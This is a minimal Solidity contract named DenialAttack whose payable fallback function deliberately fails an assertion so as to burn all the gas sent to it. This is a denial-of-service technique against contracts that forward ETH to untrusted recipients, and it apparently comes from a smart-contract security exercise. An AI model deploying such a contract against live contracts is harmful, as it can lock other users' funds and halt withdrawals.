pragma solidity ^0.5.0;

contract DenialAttack {

  function () external payable {
      // consume all the gas
      assert(1==2);
  }

}
